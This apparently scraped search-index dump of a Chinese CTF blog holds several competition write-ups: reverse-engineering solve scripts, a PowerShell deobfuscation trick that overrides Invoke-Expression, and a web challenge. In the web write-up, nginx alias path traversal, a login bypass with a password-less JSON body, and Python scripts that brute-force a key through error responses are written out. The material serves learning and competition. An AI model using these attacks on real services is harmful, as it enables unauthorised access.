src = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{_' dst = 'Rp5v{AZmM8XWy1sgNhTB_oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw' table = [] for x in dst: table.append(src.index(x)) rtable = [] for x in src: rtable.append(dst.index(x)) #print(rtable) sub_table = [ 0xfb,0x7b,0x4e,0xbb,0x51,0x15,0x8d,0xdb, 0xb0,0xac,0xa5,0x8e,0xaa,0xb2,0x60,0xeb, 0x63,0x5c,0xde,0x42,0x2b,0xc6,0xa6,0x35, 0x30,0x43,0xd6,0x5f,0xbd,0x24,0xb1,0xe3, 0x8c,0xa7,0xd5,0x2a,0x7c,0x6d,0x8b,0x17, 0x9d,0x83,0xfe,0x69,0x10,0x59,0xa9,0x9e, 0x0f,0x1c,0x66,0x97,0x5b,0x61,0xed,0xad, 0xe0,0xda,0x27,0x06,0x25,0xdc,0x5e,0xe7, 0x41,0x32,0xd2,0xd9,0x8f,0xee,0xaf,0x03, 0x93,0x3a,0x00,0xa2,0xe1,0xb3,0xec,0x81, 0x9f,0xca,0x58,0xb7,0x79,0xfd,0x3b,0xa0, 0x02,0x0c,0xcb,0xa8,0x80,0xc0,0x16,0x4d, 0x2f,0x75,0x71,0x0a,0x04,0x39,0xff,0xc1, 0x9c,0xab,0xef,0xa4,0xd8,0xe2,0x14,0xc2, 0x6c,0x64,0x1e,0x6b,0x7e,0x99,0x2e,0x09, 0x0b,0x86,0x74,0x6a,0xc4,0x2d,0x4f,0xf9, 0xfa,0x94,0xb6,0x1f,0x89,0x6f,0x5d,0xe8, 0xea,0xb5,0x5a,0x65,0x88,0xc5,0x7f,0x77, 0x11,0xcf,0xf1,0x1b,0x3f,0xf4,0x48,0x47, 0x12,0xe4,0xba,0xdf,0xe9,0x62,0x6e,0xb4, 0x96,0xcd,0x13,0x53,0x4b,0x28,0xd7,0xd1, 0x33,0xb8,0xe6,0x7a,0x2c,0x9b,0x29,0x44, 0x52,0xf7,0x20,0xf2,0x31,0xd3,0xb9,0x40, 0xd0,0x34,0xf5,0x54,0x1a,0x01,0xa1,0x92, 0xfc,0x85,0x07,0xbe,0xdd,0xbc,0x19,0xf3, 0x36,0xf6,0x72,0x98,0x4c,0x7d,0xc7,0xd4, 0x45,0x4a,0x9a,0xc3,0x8a,0xe5,0x50,0x46, 0xcc,0x68,0x76,0x67,0xc9,0x0e,0x3c,0x57, 0xf0,0x22,0xbf,0x26,0x84,0x0d,0x90,0xa3, 0xae,0x3d,0x1d,0xc8,0x91,0x05,0x87,0x70, 0x08,0x73,0x21,0x49,0x55,0x3e,0x37,0x23, 0x18,0x56,0xce,0x82,0x38,0x95,0x78,0xf8, ] correct = [0xA7, 0x51, 0x68, 0x52, 0x85, 0x27, 0xFF, 0x31, 0x88, 0x87, 0xD2, 0xC7, 0xD3, 0x23, 0x3F, 0x52, 0x55, 0x10, 0x1F, 0xAF, 0x27, 0xF0, 0x94, 0x5C, 0xCD, 0x3F, 0x7A, 0x79, 0x9F, 0x2F, 0xF0, 0xE7, 0x45, 0xF0, 0x86, 0x3C, 0xF9, 0xB0, 0xEA, 0x6D, 0x90, 0x42, 0xF7, 0x91, 0xED, 0x3A, 0x9A, 0x7C, 0x01, 0x6B, 0x84, 0xDC, 0x6C, 0xC8, 0x43, 0x07, 0x5C, 0x08, 0xF7, 0xDF, 0xEB, 0xE3, 0xAE, 0xA4 ] ''' correct = [0xc3,0xba,0x14,0x69,0x6c,0xe0,0x2a,0x97, 0x2b,0x3d,0xee,0x1d,0x09,0xca,0x67,0x01, 0x7a,0xfa,0xbd,0x0e,0x7e,0xae,0x50,0x5b, 0x26,0x66,0xfc,0xd3,0x62,0x88,0x68,0x20, 0x0a,0x13,0xe4,0xc2,0x6a,0x9a,0x78,0xa8, 0x15,0xd7,0x3b,0x23,0x53,0x9d,0xb9,0x52, 0xcb,0xd9,0xfb,0x55,0x86,0x92,0xf6,0x10, 0x38,0xe9,0xec,0xbe,0xa4,0x87,0x36,0x12, ] ''' flag = list(correct) for i in range(256): f = [] for j in range(64): f.append(sub_table.index(flag[j])) flag = list(f) f = [] for i in range(64): f.append(flag[rtable[i]]) flag = list(f) #print(flag) print(flag) for _ in flag: print(chr(_), end=\"\") 发现不对，看了一下发现没有比较逻辑，反而是把flag和密文填到了某个东西里，一看是一段shellcode。F5一下 v21 = 'hs/nib/'; v2 = sys_open((const char *)\u0026v21, 0, 0); v3 = v2; v20[2] = 0; v4 = sys_read(v2, (char *)\u0026v20[2], 4uLL); v5 = v20[2]; v6 = sys_close(v3); v20[3] = '\\0'; strcpy((char *)v20, \"/etc/passwd\"); v7 = sys_open((const char *)v20, 0, 0); v8 = v7; *(_DWORD *)\u0026v18[8] = 0; v9 = sys_read(v7, \u0026v18[8], 4uLL); v10 = *(_DWORD *)\u0026v18[8]; v11 = sys_close(v8); *(_WORD *)\u0026v18['\\n'] = '\\0'; v19 = '\\0'; strcpy(v18, \"/dev/zero\"); v12 = sys_open(v18, 0, 0); v17 = 0LL; v13 = sys_read(v12, (char *)\u0026v17, 4uLL); v14 = ((unsigned __int64)~v17 \u003e\u003e 29) / (unsigned __int128)0x29uLL; v15 = sys_close(v12); v17 = ((unsigned int)v14 ^ ~__ROR4__(v10 ^ (v5 - 559038737), 11)) == 0xDEADBEEF; v16 = sys_write(v0, (const char *)\u0026v17, 8uLL); 这里面关键的几个数据 v5 从/bin/sh读入4个字节 \\x7fELF v10 从/etc/passwd读入4个字节 root v14 读/dev/null/得0，然后计算一下 小逆一下就结束了 src = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{_' dst = 'Rp5v{AZmM8XWy1sgNhTB_oCzYVdPrGn6KD3Q9lke4qtFxHb0uUOcS2jIEJfL7aiw' table = [] for x in dst: table.append(src.index(x)) rtable = [] for x in src: rtable.append(dst.index(x)) sub_table = [ 0xfb,0x7b,0x4e,0xbb,0x51,0x15,0x8d,0xdb, 0xb0,0xac,0xa5,0x8e,0xaa,0xb2,0x60,0xeb, 0x63,0x5c,0xde,0x42,0x2b,0xc6,0xa6,0x35, 0x30,0x43,0xd6,0x5f,0xbd,0x24,0xb1,0xe3, 0x8c,0xa7,0xd5,0x2a,0x7c,0x6d,0x8b,0x17, 0","date":"2023-09-09","objectID":"/hitcon2023/:4:0","tags":null,"title":"Hitcon2023 Reverse wps | AK with StrawHat","uri":"/hitcon2023/"},{"categories":null,"content":"总结 感觉这几个题里就LessEQaulmore需要小看一会吧，如果明天还有题我再来写（如果文章发布的时候你看到了这句话说明我没写） ","date":"2023-09-09","objectID":"/hitcon2023/:5:0","tags":null,"title":"Hitcon2023 Reverse wps | AK with StrawHat","uri":"/hitcon2023/"},{"categories":null,"content":"打开看到 Golang 字样，使用 go_parser 恢复一下符号。 https://github.com/0xjiayu/go_parser v24 = \"115.239.215.75\"; v25 = 14LL; v26 = \"12345\"; v27 = 5LL; *((_QWORD *)\u0026v2 + 1) = 2LL; v7 = os_exec_Command(); v12 = os_exec__Cmd_StdoutPipe(v7); 奇妙的逻辑，可以通过字符串判断是 nc 取数据，nc 115.239.215.75 12345 看一眼拿到的数据，形式如下： {1801 [ {1878 1630 {1600 1047 1355}} {1968 1923 {1602 1096 1287}} {1805 1572 {1600 1102 1283}} {1963 1669 {1600 1165 1327}}] 4} 看数据 parse 逻辑，从.rodata段残留的结构体信息恢复结构体： struct City { Name: int; Neighbours: []NeighbourCity; Delta: uint8 } struct NeighbourCity { Name: int; Distance: int; Cost: Cost; } struct Cost { Transportation: int; Time: int; Expense: int; } 看 FindPath 逻辑，简单易懂，每次选一个 NeighborCity，加上Distance，减去 Transportation， 异或 Time，乘上 Expense，加上点 Delta，找一条五种权重都满足约束的路径。 输入和选择的路对应的关系有点玄学，动调一下也不难发现是第一组对应fedc第二组对应ba98以此类推，所以只需要从起点 2 开始找到一条到终点 1986 的满足条件的路径就行了。 直接搜复杂度不对，注意到 Transportation 都大于等于 1600，而要求的约束正好是100000 - 1600*31，所以只有 Transportation 为 1600 的路径可以使用。 赛场上没看到这个调了一整天，我但凡睁开眼睛看看早就做完了，给 cnss 的民那谢罪了。 x = [#数据 ] p = 0 a = [[] for i in range(200)] o = [] i = 0 axor = [[] for i in range(200)] asub = [[] for i in range(200)] amul = [[] for i in range(200)] aadd = [[] for i in range(200)] while p \u003c len(x): a[i].append(x[p+1]-1800) a[i].append(x[p+6]-1800) a[i].append(x[p+11]-1800) a[i].append(x[p+16]-1800) aadd[i].append(x[p+2]) aadd[i].append(x[p+7]) aadd[i].append(x[p+12]) aadd[i].append(x[p+17]) asub[i].append(x[p+3]) asub[i].append(x[p+8]) asub[i].append(x[p+13]) asub[i].append(x[p+18]) axor[i].append(x[p+4]) axor[i].append(x[p+9]) axor[i].append(x[p+14]) axor[i].append(x[p+19]) amul[i].append(x[p+5]) amul[i].append(x[p+10]) amul[i].append(x[p+15]) amul[i].append(x[p+20]) o.append(x[p+21]) p += 22 i += 1 order = [] for i in range(200): order.append([0, 1, 2, 3]) for k in range(4): for j in range(3): if aadd[i][order[i][j]] \u003c aadd[i][order[i][j+1]]: tmp = order[i][j] order[i][j] = order[i][j+1] order[i][j+1] = tmp st = 2 fi = 186 vis = [0 for i in range(200)] pre = [-1 for i in range(200)] def dfs(u, dep, xx, xorsum, subsum, mulsum, addsum): vis[u] = 1 if dep == 31: if u == fi and mulsum == 0xAA000000 and addsum == 0xD898 and subsum == 0xC4E0 and xorsum == 0x3D0 and xx == 131: print(\"%x\"%mulsum) print(\"%x\"%addsum) print(\"%x\"%subsum) print(\"%x\"%xorsum) print(\"Solved\") return 1 return 0 if subsum \u003c 0xC4E0: return 0 if addsum \u003e 0xD898: return 0 if xx \u003e 131: return 0 for i in range(4): v = a[u][i] if asub[u][i] != 1600: continue if vis[v] == 0: vis[v] = 1 if dfs(v, dep+1, xx+o[u], xorsum^axor[u][i], subsum-asub[u][i], (mulsum*amul[u][i])\u00260xFFFFFFFF, addsum+aadd[u][i]) == 1: print(u, end=\", \") return 1 vis[v] = 0 vis[u] = 0 return 0 vis[st] = 1 dfs(st, 0, 0, 0, 100000, 1, 0) lis = [186, 187, 188, 189, 190, 191, 172, 153, 134, 114, 94, 74, 53, 32, 11, 10, 29, 48, 68, 88, 107, 126, 145, 144, 143, 122, 101, 80, 60, 40, 21, 2] i = len(lis)-1 print(\"\") nowp = 0 table = \"fedcba9876543210\" while i \u003e 0: n = -1 for j in range(4): if a[lis[i]][j] == lis[i-1]: n = j break if n == -1: print(\"panic\") print(table[nowp+n], end=\"\") nowp += 4 nowp %= 16 i -= 1 SCTF{db61f852f960da71c873e950e952c97} ","date":"2023-06-20","objectID":"/gson/:0:0","tags":null,"title":"SCTF2023 - SycGson","uri":"/gson/"},{"categories":null,"content":"碎碎念 ​ 刚进黑灯模式就出了flag，看到还是 0 解题以为可以拿全场唯一解光荣退役了，结果平台的flag配置是烂的，以为 0 解的原因是平台烂直接找运维对线，拉扯了一个小时左右赛后说 pwsh 需要人工验证flag以为其实大家都会做只是没交上，第二天起床一看还真是一血全场只有 2 解。也算光荣退役了？ 但是比赛结果一般，打ctf不如闲鱼买flag，整场比赛充斥着国粹这种脑瘫题，不过打不过闲鱼哥还是我太菜了。 ","date":"2023-05-28","objectID":"/pwsh/:0:1","tags":null,"title":"ciscn2023-Pwsh Powershell反混淆对抗实战","uri":"/pwsh/"},{"categories":null,"content":"Writeups 初步分析 题目备份：https://small.fileditch.ch/s3/ssQpUZIxaIRvkfVeChBp.ps1 一个powershell脚本，先base64后解密再执行，先上手解密base64串 with open(\"p4.ps1\", \"w\") as f: f.write(base64.b64decode(code).decode()) $M=@{129693309641433576095262078804193086780='(New-ObJecT sysTEm.Io.COMpResSIoN.DEflATesTReAm( [SyStEM.iO.meMORYsTreaM] [sYSTEm.CoNVErT]::FRoMbASe64StrIng( \"1VhNaxxHED3Xv+iDYXZBWuwEArHJwQYTy8gS2CKHiCUHIX/koDiKyMXWf89G8s7Ux6ue7hpN7zqBZKa7qvrVq1fVs+rSt3/o7j/0/wNtH+5eaLt7/ySWktmmbThuTP06bfe1pY0grNUi9fY6tPHOBLYnkec17FuLnpHEY2RyVgsqS5T0kLM+yiyA4CTXSa3yOoO4EoWLS+U6mjtxF2K75DKYVx5LkgBWtpCjUBYE+GdMvFpoCXFswiShhd3ABXQR9mqKxxdje1RGgPmqqWXTICCR7fTEbe1HV7FJv+2yAUYpYq2Pjj....' $t=Read-Host -Prompt \"Enter your flag\"; [System.Collections.Queue]$tt=([byte[]][char[]]$t|%{$_ -shr 4;$_%16}); iex($M[129693309641433576095262078804193086780]) M太长了这里就不放了，可以看到M是一个字典，对应的是混淆过的powershell脚本，每个key(一串数字)分别对应了一段混淆过的powershell的脚本，尝试解混淆。 混淆分析 混淆方式类似如下，这里给出几个样本： (New-ObJecT sysTEm.Io.COMpResSIoN.DEflATesTReAm( [SyStEM.iO.meMORYsTreaM] [sYSTEm.CoNVErT]::FRoMbASe64StrIng( \".....\" ) ,[SYSTeM.io.COMpRESSIoN.COmPressiOnmODe]::dECoMprEss ) | FoREaCH-objEct{New-ObJecT sySTem.Io.StReamreAder( $_ , [TexT.enCOdING]::ascII) }|FOrEacH-obJECt{$_.REAdtoend( )} )|. ( $sHElLId[1]+$Shellid[13]+\"X\"); \u0026( $SHEllID[1]+$SHEllid[13]+\"X\") ( nEw-obJEcT System.io.STREAMrEADeR((nEw-obJEcT IO.cOMPreSsiOn.deFLaTeSTreAm([system.io.MeMoRYStReam][sYsTem.COnVERt]::fROMBAsE64sTRiNG(\" ...\") , [sYsTEm.io.COmPREsSIoN.coMpRessionmoDE]::deComPResS )|% { nEw-objEcT iO.StREamREAdEr( $_ ,[TExt.EncOdING]::asCii )}|%{ $_.ReadtoeND( ) })|\u0026 ( $EnV:cOMspEc[4,15,25]-joiN\"\"); ( New-OBjecT system.iO.STreAmReAdeR(( New-OBjecT SYstEM.IO.cOMprESsion.DeFlATeStrEAm( [io.meMOrySTReAm][cONVert]::FrOmBASE64sTrInG( \"...\"),[SysTEm.IO.coMPreSsIon.coMpreSsIonMODE]::decOmPress )),[sYsTeM.TEXT.ENcOdiNg]::aSciI) ).REAdtoeND()| .( $pShOmE[21]+$pShoME[34]+\"x\"); 可以归纳为以下的模式： iex的变种 (混淆过的字符串和对应的解密代码) 混淆过的字符串和对应的解密代码 | iex的变种 其中 iex 是 powershell 的一个 cmdlet 指令，全名 Invoke-Expression ，作用是执行表达式（类似eval()）。 在上面的例子中，混淆过的字符串和对应的解密代码都是base64和压缩，但在嵌套的更深层次的混淆中，存在很多种加密或编码方式。 而iex的变种是如下几种： ( $SHEllID[1]+$SHEllid[13]+\"X\") ( $EnV:cOMspEc[4,15,25]-joiN\"\") .( $pShOmE[21]+$pShoME[34]+\"x\") 在嵌套的更深层次的混淆中同样存在非常多种iex的变种，这里只是其中几种。 （除此之外还有随机大小写混淆但是不关注） 静态解混淆尝试 一个直观的思路是去掉代码中的iex变种变成字符串解密操作，直接运行得到解密后的代码。但是混淆后的代码多达1000+个，每个都有5~6层混淆嵌套，手动非常的不现实。 本来想当正则大师解决，但是iex变种有20+种难以收集，且存在混淆，执行方式也不一样。 另外这里有个对本题没有帮助的仓库。https://github.com/pan-unit42/public_tools/tree/master/powershellprofiler 动态解混淆 ​ 很明显我们的目的是找到一种自动化解混淆的方式。如果我们不考虑静态分析，而是考虑 Hook Powershell里的iex函数，让它每次被调用的时候都改为输出参数的值然后直接运行脚本呢？ 查一查可以找到在Powershell中命令默认的调用顺序： Alias Function Cmdlet 本机 Windows 命令 Powershell 会按照上面的顺序寻找，并且调用第一个被寻找到的方法 可以发现，对 Function 的调用优先于 Cmdlet。也就是说如果我们定义一个名为Invoke-Expression的函数，在iex被调用时将会调用我们的自定义函数而不是iex。 编写如下函数重载iex. function Invoke-Expression{$input|%{$_;};$args|%{$_;}}; 作用是将input（用于管道执行方法）或args（用于调用执行方法）直接输出。 现在我们可以自动化解混淆，请一个 python 大师来完成。 注意到代码中包含一些干扰直接执行的代码比如while($true){echo Warning!};和(sleep 10000);会导致程序卡死，但是情况不多（就这两种）特判一下即可。 Script by Timlzh import subprocess from threading import Thread from json import loads, dumps with open('hash.json', 'r') as f: hash_dict = eval(f.read()) redir = \"function Invoke-Expression{$input|%{$_;};$args|%{$_;}};\" cmd = 'powershell.exe' result = {} cnt = 0 def exp(line): try: script = redir + line.strip('\\n') + '\\n' p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE) out, err = p.communicate(script.encode('utf-8')) res = out.split(b'\\n')[6].strip().decode('gbk') if('while' in res or 'sleep' in res): return res if(res == '' or 'F:\\\\CNSS\u003e' in res or '无法将' in res or '无效的' in res or '然后' in res or '不能' in res): raise Exception('error') return exp(res) except Exception as e: return line def run(key, cnt): result[key] = [] for x, line in enumerate(hash_dict[key].split(';')): print(cnt, x) result[key].append(exp(line)) t = [] for key in hash_dict.keys(): t.append(Thread(target=run, args=(key,cnt,))) t[-1].start() cnt += 1 if cnt % 10 == 0: for x in t:","date":"2023-05-28","objectID":"/pwsh/:0:2","tags":null,"title":"ciscn2023-Pwsh Powershell反混淆对抗实战","uri":"/pwsh/"},{"categories":null,"content":"总结 虽然看起来是狗屎但是其实做起来还好（如果有思路的话），但是这平台是烂的我不好说。 ","date":"2023-05-28","objectID":"/pwsh/:0:3","tags":null,"title":"ciscn2023-Pwsh Powershell反混淆对抗实战","uri":"/pwsh/"},{"categories":null,"content":"碎碎念 ​ 本来没想着网鼎杯能进总决赛的，毕竟青龙组100+个队就给了12个晋级名额。结果 RHG 一开快手+强运+队友给力直接飞到前十躺进了总决赛，半决赛两个 pwn 防御也是水得不行，本想着逆向手进场观摩队友做题结果意外和 Photon 大哥合力把 pwn 基本 ak 了，只能说运气很好。 ​ 总决赛基本没有逆向手的题（共同防御那个java题出来的时候我精神状态不是很稳定，exp一直挂到了比赛结束），值得复盘的也就只有这个还挺有意思的web综合题了，我还是太菜了。 ","date":"2023-04-18","objectID":"/wdb2022/:1:0","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞分析 ​ 题目镜像丢了，别问。 ","date":"2023-04-18","objectID":"/wdb2022/:2:0","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点1 ​ 登录进去是一个简单的登录框，试着打了两个单引号发现似乎没有 SQL 注入，Burp 一开先抓包再考虑别的。 ​ 突破口在 Response Header里的 Server: Cpython3.5，可以发现似乎是 python 的后端，应该是 Flask 框架， 试了一下没有模板注入的点，考虑__pycache__泄漏，整了半天也没访问到pycache文件夹。根据资源请求随便试了一下/static目录，发现可以访问。 ​ 理论上说 py 代码应该在static上级目录的某处，一通乱试发现/static../路径可以访问上级目录，目录结构如下： | __pycache__ | __init__.cpython-35.pyc | models.cpython-35.pyc | main | __pycache__ | __init__.cpython-35.pyc | forms.cpython-35.pyc | views.cpython-35.pyc | __init__.py | forms.py | views.py | static | 不重要 | templates | 不重要 | __init__.py | models.py | nginx.conf 查看nginx.conf文件 user www-data; worker_processes auto; pid /run/nginx.pid; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## #access_log /var/log/nginx/access.log; #error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable \"msie6\"; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server { listen 80 default_server; server_name localhost; autoindex on; location /static { alias /secret/app/static/ ; } location ~* \\.(py)$ { deny all; } location ~* (cmdline|environ)$ { deny all; } location / { limit_conn conn 10; proxy_pass http://localhost:8000; proxy_set_header Host $host:$server_port; proxy_redirect ~^http://127.0.0.1:8000(.*) http://127.0.0.1$1; add_header Server Cpython3.5; } } ## # Virtual Host Configs ## } 发现py文件全都不能访问，漏洞应该是由alias /secret/app/static/ ;引起的。 考虑从pycache中dump pyc字节码进行逆向。 其实打到这一步已经试了一个多小时，我要是有哪怕一点web安全经验我会是这个鸟样子？ ","date":"2023-04-18","objectID":"/wdb2022/:2:1","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点2 核心逻辑在views.py，使用 uncompyle6 逆向结果如下： # views.py from flask import render_template, redirect, request, url_for, flash, jsonify, current_app from flask.ext.login import login_user, login_required, logout_user, current_user from . import main from werkzeug.security import generate_password_hash, check_password_hash from .. import db import string, random, os from ..models import User, Post import base64 @main.route('/login', methods=['GET']) def login(): if current_user.is_authenticated: return redirect(url_for('main.index')) return render_template('login.html') @main.route('/logout', methods=['GET']) @login_required def logout(): logout_user() return redirect(url_for('.login')) @main.route('/', methods=['GET', 'POST']) @login_required def index(): post = Post.query.filter_by(id=1).first() return render_template('index.html', flag=post.enc_text) @main.route('/api/login/', methods=['POST']) def apiLogin(): req = request.get_json() if not req: return jsonify(result=False) try: user = User.query.filter_by(**req).first() except Exception as e: return jsonify(result=False) else: if not user: return jsonify(result=False) return jsonify(result=True) @main.route('/api/check/', methods=['POST']) def check(): post = Post.query.filter_by(id=1).first() req = request.get_json() if not req: return jsonify(result=False) else: if req['key']: enc_key, key = str(base64.b64decode(post.enc_key), encoding='utf-8'), req['key'] encoder = Encoder() if len(enc_key) != len(key): return jsonify(result=False) for x, y in zip(enc_key, key): if x != encoder.do_encrpt(y): return jsonify(result=False) encoder = Encoder(enc_key) flag = '' for i in str(base64.b64decode(post.enc_text), encoding='utf-8'): flag += encoder.do_encrpt(i) return jsonify(result=flag) return jsonify(result=False) class Encoder: def __init__(self, crypt_key=None): if crypt_key is None: crypt_key = current_app.config['KEY'] self.stream = self.randomBox(self._init_box(crypt_key)) def do_encrpt(self, c): return chr(ord(c) ^ next(self.stream)) def _init_box(self, crypt_key): \"\"\" 初始化 置换盒 \"\"\" Box = list(range(256)) key_length = len(crypt_key) j = 0 for i in range(256): index = ord(crypt_key[(i % key_length)]) j = (j + Box[i] + index) % 256 Box[i], Box[j] = Box[j], Box[i] return Box def randomBox(self, S): \"\"\" 加密/解密 s : box \"\"\" i = 0 j = 0 while True: i = i + 1 \u0026 255 j = j + S[i] \u0026 255 S[i], S[j] = S[j], S[i] yield S[(S[i] + S[j] \u0026 255)] # okay decompiling views.cpython-35.pyc model.py也有一些用处 # model.py from . import db from flask.ext.login import UserMixin from . import login_manager from werkzeug.security import generate_password_hash, check_password_hash from flask import current_app class User(UserMixin, db.Model): __tablename__ = 'user' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(64), unique=True, index=True) password = db.Column(db.String(128)) def __repr__(self): return '\u003cUser %s\u003e' % self.username class Post(db.Model): __tablename__ = 'post' id = db.Column(db.Integer, primary_key=True) user_id = db.Column(db.Integer) enc_text = db.Column(db.Text) enc_key = db.Column(db.Text) def __repr__(self): print('\u003cPost %s\u003e' % self.id) @login_manager.user_loader def load_user(user_id): return User.query.get(int(user_id)) 漏洞在登录验证逻辑： @main.route('/api/login/', methods=['POST']) def apiLogin(): req = request.get_json() if not req: return jsonify(result=False) try: user = User.query.filter_by(**req).first() except Exception as e: return jsonify(result=False) else: if not user: return jsonify(result=False) return jsonify(result=True) 登录验证接受一个数据包，直接将数据包对应的字段在数据库中查询，若能查询到对应的user则返回登录成功。 正常发送数据包应该为： { \"username\":\"admin\", \"password\":\"xxxxxx\" } 此时若密码错误则无法登录，密码是否为空仅在前端判断，构造 payload 如下： { \"username\":\"admin\" } 无 password 字段，则可以在数据库中查询到对应的用户，成功绕过登录验证，登录成功。 但是并没有什么卵用，我们打不到flag。 ","date":"2023-04-18","objectID":"/wdb2022/:2:2","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点3 考虑打flag check的API。 @main.route('/api/check/', methods=['POST']) def check(): post = Post.query.filter_by(id=1).first() req = request.get_json() if not req: return jsonify(result=False) else: if req['key']: enc_key, key = str(base64.b64decode(post.enc_key), encoding='utf-8'), req['key'] encoder = Encoder() if len(enc_key) != len(key): return jsonify(result=False) for x, y in zip(enc_key, key): if x != encoder.do_encrpt(y): return jsonify(result=False) encoder = Encoder(enc_key) flag = '' for i in str(base64.b64decode(post.enc_text), encoding='utf-8'): flag += encoder.do_encrpt(i) return jsonify(result=flag) return jsonify(result=False) Encoder类是一个简单的RC4，凭借我并不多的密码学知识我觉得这个RC4是非常安全的，攻击面应该不在这里。 大致的逻辑是传入key，使用RC4检验key，若等于在数据库中的密文则返回flag。 一开始考虑泄漏enc_key，但是我并没有能够泄漏这个东西的web水平，或者说这个东西应该是安全的。 考虑仔细分析一下这个代码。 if len(enc_key) != len(key): return jsonify(result=False) 首先是长度check。enc_key应该是一个byte字符串，key由我们自己传入，而python的len()函数不止对字符串有效，我们也可以传入一个list。 for x, y in zip(enc_key, key): if x != encoder.do_encrpt(y): return jsonify(result=False) check逻辑。这个逻辑很奇怪，并不是把明文整个拿去加密，而是一个一个字符加密并比较，应该是需要one-by-one爆破。 这里看了很久也没有想到怎么爆破，甚至写了一个侧信道的脚本（怎么想都不可行）。后来在人肉fuzz的时候发现如果传入的key是一个int类型则会返回500内部错误。 这里的漏洞出在这里： def do_encrpt(self, c): return chr(ord(c) ^ next(self.stream)) 数字没有ord()，在ord的时候会报错，这为我们提供了逐字节爆破的可能。 爆破长度 首先考虑过len(enc_key) == len(key)的check。不难发现，若传入一个全数字的list，若长度错误则会返回{result: False}，若长度正确则会进入check逻辑，对key[0]也就是第一个数字进行加密，导致异常得到500状态码。 import requests import string import json url = \"http://172.16.9.15:6081/api/check/\" header = { 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36', 'Content-Type': 'application/json', 'Origin': 'http://172.16.9.15:6081', 'Referer': 'http://172.16.9.15:6081/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' } data = { 'key': [] } for i in range(255): data['key'].append(1) resp = requests.post(url, headers = header, data = json.dumps(data)) if resp.content[0] != 123: print(f\"[+]length:\", i+1) break 得到长度为30。 爆破key 使用相同的逻辑，依次爆破key的每一位，并且在后续添加全数字，如果该位key正确则会继续加密后一位的数字导致500，否则返回{result: False}。 import requests import string import json url = \"http://172.16.9.15:6081/api/check/\" header = { 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36', 'Content-Type': 'application/json', 'Origin': 'http://172.16.9.15:6081', 'Referer': 'http://172.16.9.15:6081/login', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' } data = { 'key': [] } for i in range(255): data['key'] = ['S', 'Q', 'D', '6', '8', 'u', 'i', 'y', 'o', '6', 'k', 'd', 'K', 'r', 'w', '9', 'm', 'd', '1', 'L', '3', 'n', 'J', '3', '1', 'E', 'x', '0', 'F'] #这里我来不及调了，直接手动一个一个往里面放的 j = len(data['key']) data['key'].append(chr(i)) for i in range(30-j-1): data['key'].append(1) print(data['key']) resp = requests.post(url, headers = header, data = json.dumps(data)) if resp.content[0] != 123: break 最终在该环节关闭的5分钟前解出了该题flag。我要是会web我会是这个鸟样子？ ","date":"2023-04-18","objectID":"/wdb2022/:2:3","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞修复 这里修了上面发现的3个洞，但是应该修错了或是有剩下的洞没有发现，次数用完了也没有防御成功。仅提供修复思路作为参考。 ","date":"2023-04-18","objectID":"/wdb2022/:3:0","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点1 修改nginx.conf location /static { deny all ; } ","date":"2023-04-18","objectID":"/wdb2022/:3:1","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点2 这个地方修得很丑陋，应该是完全修错了 加入字段判断 if req['id']: return jsonify(result=False) if not req['username']: return jsonify(result=False) if not req['password']: return jsonify(result=False) ","date":"2023-04-18","objectID":"/wdb2022/:3:2","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":"漏洞点3 直接用try:....except:...框起来 ","date":"2023-04-18","objectID":"/wdb2022/:3:3","tags":null,"title":"网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)","uri":"/wdb2022/"},{"categories":null,"content":" Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE 